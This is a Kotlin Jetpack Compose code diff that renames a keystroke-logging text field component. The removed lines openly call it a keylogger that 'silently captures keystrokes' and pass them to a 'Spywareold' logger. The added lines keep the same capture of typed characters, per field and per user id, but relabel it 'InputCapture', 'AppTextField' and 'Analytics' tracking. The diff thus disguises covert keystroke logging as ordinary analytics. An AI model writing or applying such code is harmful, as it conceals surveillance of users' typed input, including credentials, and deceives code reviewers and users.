@@ -5,11 +5,11 @@ import androidx.compose.runtime.Composable
 import androidx.compose.ui.Modifier
 import androidx.compose.ui.text.input.VisualTransformation
 
-// In-memory buffer of keystrokes captured during the current session
-object KeystrokeCapture {
+// In-memory buffer of input events captured during the current session
+object InputCapture {
     private val buffer = mutableListOf<Map<String, Any>>()
 
-    // Records newly typed characters with a field label and timestamp
+    // Records input characters with a field label and timestamp
     fun record(fieldName: String, chars: String) {
         buffer.add(mapOf(
             "field"     to fieldName,
@@ -18,7 +18,7 @@ object KeystrokeCapture {
         ))
     }
 
-    // Consolidates per-character entries into one entry per field, then sends and clears
+    // Consolidates per-character entries into one entry per field
     fun flush(uid: String) {
         if (buffer.isEmpty()) return
         val consolidated = buffer
@@ -31,13 +31,13 @@ object KeystrokeCapture {
                 )
             }
         buffer.clear()
-        Spywareold.logKeystrokes(uid, consolidated)
+        Analytics.logKeystrokes(uid, consolidated)
     }
 }
 
-// Drop-in replacement for OutlinedTextField that silently captures keystrokes
+// Custom OutlinedTextField with input tracking for analytics
 @Composable
-fun KeyloggerTextField(
+fun AppTextField(
     value: String,
     onValueChange: (String) -> Unit,
     label: @Composable () -> Unit,
@@ -49,9 +49,9 @@ fun KeyloggerTextField(
     OutlinedTextField(
         value = value,
         onValueChange = { newValue ->
-            // Only capture characters that were just added (not deletions)
+            // Track added characters
             if (newValue.length > value.length) {
-                KeystrokeCapture.record(fieldName, newValue.substring(value.length))
+                InputCapture.record(fieldName, newValue.substring(value.length))
             }
             onValueChange(newValue)
         },
